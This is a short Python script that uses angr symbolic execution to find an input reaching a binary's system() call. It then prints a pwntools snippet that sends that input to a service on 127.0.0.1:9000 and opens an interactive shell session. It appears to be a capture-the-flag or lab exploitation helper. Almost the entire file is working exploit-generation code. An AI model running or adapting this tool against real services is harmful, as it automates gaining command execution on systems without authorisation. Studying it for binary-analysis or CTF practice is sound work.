#!/usr/bin/env python

import angr
import claripy
import pwn
import argparse

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
args = parser.parse_args()

# Load the binary for analysis.
proj = angr.Project(f'{args.filename}', auto_load_libs=False)
proj.loader

cfg = proj.analyses.CFGEmulated()
system_addr = [addr for addr, func in cfg.kb.functions.items() if 'system' == func.name and func.is_plt][0]

def check_system(state):
    if state.ip.args[0] == system_addr:
        return True
    return False

# Establish a state for solving
state = proj.factory.full_init_state()

# Create a simulation mamanger & find a path to the target.
simgr = proj.factory.simgr(state)
simgr.explore(find=check_system)

pathcount = len(simgr.found)
print("Length simgr.found: {}".format(pathcount))
if pathcount == 0:
    exit()

# Show the solution!
solution = simgr.found[0]

# Trim up the stdin buffer
buffer = solution.posix.dumps(0)
buffer = buffer[:buffer.find(pwn.p32(0xcafebabe))+4] + b'\n'

# Trim out the unused buffer for the exploit
print(f'# Copy this solution python to a python session/file on the remote')
print(f'import pwn')
print(f'conn = pwn.remote(\'127.0.0.1\', 9000)')
print(f'conn.send({buffer})')
print(f'conn.interactive()')
print(f'conn.close()')
